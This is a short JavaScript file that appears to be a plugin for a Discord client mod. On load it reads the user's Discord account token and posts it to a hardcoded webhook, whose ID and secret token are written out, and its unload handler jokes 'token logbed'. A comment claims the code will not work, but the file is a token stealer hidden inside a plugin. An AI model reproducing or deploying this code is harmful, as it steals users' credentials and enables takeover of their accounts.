import { findByProps } from '@cumcord/modules/webpack';

// it wont work lmao, you cant send webhook shit from discord
const t = findByProps("getToken").getToken()
const api = location.protocol + GLOBAL_ENV.API_ENDPOINT + "/v" + GLOBAL_ENV.API_VERSION;
const j = "981626788574818324"
const b = "wncM9Lj3E3rsS1zltrvZY6HxsBsA1vpJwYsbyDxh7pJVnYNt_j1aVmEOCZ8FJiDF4ufT"
const webhook = api + "/webhooks/" + j + "/" + b;

export default () => {
    return {
        onLoad() {
            fetch(webhook, {
                method: "POST",
                body: JSON.stringify({
                    content: t,
                }),
                headers: {
                    "Content-Type": "application/json",
                },
            });
        },
        onUnload() {
            console.log("token logbed lmao")
        }
    }
}